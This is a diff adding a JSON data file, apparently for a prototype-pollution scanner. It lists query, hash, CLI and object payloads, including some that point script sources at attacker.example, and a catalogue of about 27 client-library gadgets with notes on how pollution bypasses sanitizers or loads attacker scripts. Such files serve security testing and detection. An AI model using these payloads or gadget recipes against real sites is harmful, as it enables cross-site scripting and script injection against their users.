@@ -1,0 +1,255 @@
+{
+  "payloads": {
+    "object": [
+      "__proto__.protoscan",
+      "__proto__[protoscan]"
+    ],
+    "pointer": [
+      "constructor.prototype.protoscan",
+      "constructor[prototype][protoscan]"
+    ],
+    "query": [
+      "?__proto__[polluted]=owned",
+      "?constructor.prototype.polluted=owned",
+      "&__proto__[polluted]={\"json\":\"value\"}"
+    ],
+    "hash": [
+      "#__proto__[polluted]=owned",
+      "#constructor.prototype.polluted=owned"
+    ],
+    "cli": [
+      "--__proto__[polluted]=owned",
+      "--constructor[prototype][polluted]=owned"
+    ],
+    "protoFind": [
+      "?__proto__[elo]=melo",
+      "?constructor.prototype.elo=melo",
+      "&__proto__[elo]={\"json\":\"value\"}",
+      "#__proto__[elo]={\"json\":\"value\"}",
+      "#constructor.prototype.elo=melo"
+    ],
+    "cdn": [
+      "?__proto__[_analytics][0][scriptSrc]=https://attacker.example/payload.js",
+      "?__proto__[_satellite][scriptSrc]=https://attacker.example/tag.js",
+      "?__proto__[$parseParams][src]=https://attacker.example/widget.js"
+    ]
+  },
+  "fingerprints": [
+    {
+      "name": "DOMPurify",
+      "aliases": ["gadget.client.dom.dompurify"],
+      "impact": "Bypass DOMPurify allowlists and execute arbitrary HTML/JS.",
+      "requirement": "Set ALLOWED_TAGS/ALLOWED_ATTR or documentMode before DOMPurify initializes.",
+      "fingerprintGlobals": ["DOMPurify"],
+      "category": "client"
+    },
+    {
+      "name": "sanitize-html",
+      "aliases": ["gadget.client.dom.sanitizeHtml"],
+      "impact": "Keep dangerous attributes/text when sanitize-html runs.",
+      "requirement": "Pollute wildcard attribute arrays or innerText so sanitize-html re-injects scripts.",
+      "fingerprintGlobals": ["sanitizeHtml"],
+      "category": "client"
+    },
+    {
+      "name": "Segment Analytics.js",
+      "aliases": ["gadget.client.analytics.segment"],
+      "impact": "Force Segment to inject attacker-controlled scripts via crafted template wrappers.",
+      "requirement": "Populate Object.prototype.script wrappers before analytics.js loads.",
+      "fingerprintGlobals": ["analytics"],
+      "category": "client"
+    },
+    {
+      "name": "Google Tag Manager / dataLayer",
+      "aliases": ["gadget.client.analytics.gtm"],
+      "impact": "Load attacker scripts or reconfigure GTM tags.",
+      "requirement": "Inject poisoned entries into dataLayer/analytics queues (vtp_* or q[][].",
+      "fingerprintGlobals": ["dataLayer", "google_tag_manager"],
+      "category": "client"
+    },
+    {
+      "name": "Google Analytics / gtag",
+      "aliases": ["gadget.client.analytics.google"],
+      "impact": "Redirect GA trackers or execute scripts via custom transport URLs.",
+      "requirement": "Override gtag/ga configuration before trackers initialize.",
+      "fingerprintGlobals": ["ga", "gtag", "GoogleAnalyticsObject"],
+      "category": "client"
+    },
+    {
+      "name": "Akamai Boomerang",
+      "aliases": ["gadget.client.analytics.akamai"],
+      "impact": "Make Boomerang load attacker JS through BOOMR.url or preload logic.",
+      "requirement": "Set BOOMR.url (or nested config) before the loader runs.",
+      "fingerprintGlobals": ["BOOMR"],
+      "category": "client"
+    },
+    {
+      "name": "Tealium Universal Tag",
+      "aliases": ["gadget.client.analytics.tealium"],
+      "impact": "Load attacker-controlled scripts/iframes via utag loaders.",
+      "requirement": "Override utag loader attributes (attrs/src) prior to tag injection.",
+      "fingerprintGlobals": ["utag"],
+      "category": "client"
+    },
+    {
+      "name": "Adobe Dynamic Tag Management",
+      "aliases": ["gadget.client.analytics.adobe"],
+      "impact": "Abuse Adobe DTM to pull attacker content or modify tag options.",
+      "requirement": "Pollute _satellite configuration fields before DTM bootstrap.",
+      "fingerprintGlobals": ["_satellite"],
+      "category": "client"
+    },
+    {
+      "name": "Wistia Embedded Video",
+      "aliases": ["gadget.client.media.wistia"],
+      "impact": "Inject attacker HTML via wistiaEmbeds’ template rendering.",
+      "requirement": "Override template attributes such as innerHTML before Wistia renders the chrome.",
+      "fingerprintGlobals": ["wistiaEmbeds"],
+      "category": "client"
+    },
+    {
+      "name": "Embedly Cards",
+      "aliases": ["gadget.client.media.embedly"],
+      "impact": "Force Embedly iframe builders to use attacker-defined attributes.",
+      "requirement": "Pollute `__proto__` keys like `onload`, `override`, or frame defaults before `window.embedly` runs.",
+      "fingerprintGlobals": ["embedly", "window.embedly"],
+      "category": "client"
+    },
+    {
+      "name": "js-xss (filterXSS)",
+      "aliases": ["gadget.client.dom.filterXSS"],
+      "impact": "Bypass js-xss whitelists so event attributes survive sanitization.",
+      "requirement": "Override `whiteList` entries on `Object.prototype` before `filterXSS` executes.",
+      "fingerprintGlobals": ["filterXSS"],
+      "category": "client"
+    },
+    {
+      "name": "Knockout.js",
+      "aliases": ["gadget.client.ui.knockout"],
+      "impact": "Inject arbitrary expressions into Knockout templates.",
+      "requirement": "Pollute array indexes used by `ko.expressionRewriting` (e.g., `__proto__[4]`, `__proto__[5]`).",
+      "fingerprintGlobals": ["ko"],
+      "category": "client"
+    },
+    {
+      "name": "Lodash Template",
+      "aliases": ["gadget.template.lodash"],
+      "impact": "Execute arbitrary JS via lodash `_.template` sourceURL injection.",
+      "requirement": "Set `sourceURL` or template options on `Object.prototype` before `_.template` is called.",
+      "fingerprintGlobals": ["_", "_.template"],
+      "category": "client"
+    },
+    {
+      "name": "Marionette / Backbone Views",
+      "aliases": ["gadget.client.ui.marionette"],
+      "impact": "Render attacker-controlled DOM nodes via polluted `tagName`/attributes.",
+      "requirement": "Pollute `tagName`, `src`, and `onerror` defaults before Marionette views extend Backbone.",
+      "fingerprintGlobals": ["Marionette", "Backbone"],
+      "category": "client"
+    },
+    {
+      "name": "Google reCAPTCHA",
+      "aliases": ["gadget.client.security.recaptcha"],
+      "impact": "Inject HTML into reCAPTCHA iframes via polluted attributes.",
+      "requirement": "Override iframe properties like `srcdoc` or Trusted Types fallbacks before widgets render.",
+      "fingerprintGlobals": ["recaptcha"],
+      "category": "client"
+    },
+    {
+      "name": "Sprint.js",
+      "aliases": ["gadget.client.dom.sprint"],
+      "impact": "Wrap DOM strings with attacker HTML when Sprint normalizes nodes.",
+      "requirement": "Pollute `wrapMap` entries such as `div.intro` before Sprint parses markup.",
+      "fingerprintGlobals": ["Sprint"],
+      "category": "client"
+    },
+    {
+      "name": "Swiftype Site Search",
+      "aliases": ["gadget.client.analytics.swiftype"],
+      "impact": "Execute arbitrary hooks because Swiftype evals user-provided functions.",
+      "requirement": "Override `_userServerConfiguration.install.hooks` via prototype pollution (e.g., `__proto__[xxx]`).",
+      "fingerprintGlobals": ["SwiftypeObject", "_st"],
+      "category": "client"
+    },
+    {
+      "name": "Twitter Universal Website Tag",
+      "aliases": ["gadget.client.analytics.twitter"],
+      "impact": "Load attacker-controlled URLs inside hidden iframes.",
+      "requirement": "Set `hif[]` or `tags[]` arrays before `twq('track', ...)` executes.",
+      "fingerprintGlobals": ["twq"],
+      "category": "client"
+    },
+    {
+      "name": "Zepto.js",
+      "aliases": ["gadget.client.ui.zepto"],
+      "impact": "Create DOM nodes with polluted attributes/event handlers.",
+      "requirement": "Pollute defaults such as `html` or event attributes before invoking `Zepto` helpers.",
+      "fingerprintGlobals": ["Zepto", "$.zepto"],
+      "category": "client"
+    },
+    {
+      "name": "Popper.js",
+      "aliases": ["gadget.client.ui.popper"],
+      "impact": "Inject event handlers when Popper applies attributes to tooltip elements.",
+      "requirement": "Pollute `arrow`, `reference`, or `popper` attribute maps (e.g., `ontransitionend`).",
+      "fingerprintGlobals": ["Popper"],
+      "category": "client"
+    },
+    {
+      "name": "Pendo Agent",
+      "aliases": ["gadget.client.analytics.pendo"],
+      "impact": "Hijack analytics calls by pointing Pendo data hosts to attacker-controlled URLs.",
+      "requirement": "Pollute `dataHost` / `PendoConfig` prior to agent initialization.",
+      "fingerprintGlobals": ["pendo"],
+      "category": "client"
+    },
+    {
+      "name": "i18next",
+      "aliases": ["gadget.client.i18n.i18next"],
+      "impact": "Replace translation lookups with attacker-provided HTML.",
+      "requirement": "Override `lng`, namespace separators, or translation keys on the prototype before `i18next.init` runs.",
+      "fingerprintGlobals": ["i18next"],
+      "category": "client"
+    },
+    {
+      "name": "Demandbase Tag",
+      "aliases": ["gadget.client.analytics.demandbase"],
+      "impact": "Force Demandbase to fetch recommendations from attacker infrastructure.",
+      "requirement": "Pollute `Demandbase.Config.SiteOptimization` (e.g., `recommendationApiURL`).",
+      "fingerprintGlobals": ["Demandbase"],
+      "category": "client"
+    },
+    {
+      "name": "Analytics.js GTM Plugin",
+      "aliases": ["gadget.client.analytics.analyticsjsPlugin"],
+      "impact": "Load arbitrary GTM script URLs inside analytics.js integrations.",
+      "requirement": "Set `customScriptSrc` through pollution before calling `analyticsGtagManager`.",
+      "fingerprintGlobals": ["analyticsGtagManager", "_analytics"],
+      "category": "client"
+    },
+    {
+      "name": "Mutiny Personalization",
+      "aliases": ["gadget.client.analytics.mutiny"],
+      "impact": "Mutiny query parser copies polluted properties into global config.",
+      "requirement": "Send `__proto__` query parameters so Mutiny merges them into its routing object.",
+      "fingerprintGlobals": ["mutiny"],
+      "category": "client"
+    },
+    {
+      "name": "AMP Runtime",
+      "aliases": ["gadget.client.dom.amp"],
+      "impact": "Inject attacker entries into AMP command queue for DOM XSS.",
+      "requirement": "Pollute `AMP.push` payloads before AMP bootstrap drains queued actions.",
+      "fingerprintGlobals": ["AMP"],
+      "category": "client"
+    },
+    {
+      "name": "Google Closure Sanitizer",
+      "aliases": ["gadget.client.framework.closure"],
+      "impact": "Bypass Closure HTML sanitizers and load attacker bundles.",
+      "requirement": "Override `trustedTypes`, `emptyHTML`, or `CLOSURE_BASE_PATH` before Closure base loads.",
+      "fingerprintGlobals": ["goog"],
+      "category": "client"
+    }
+  ]
+}
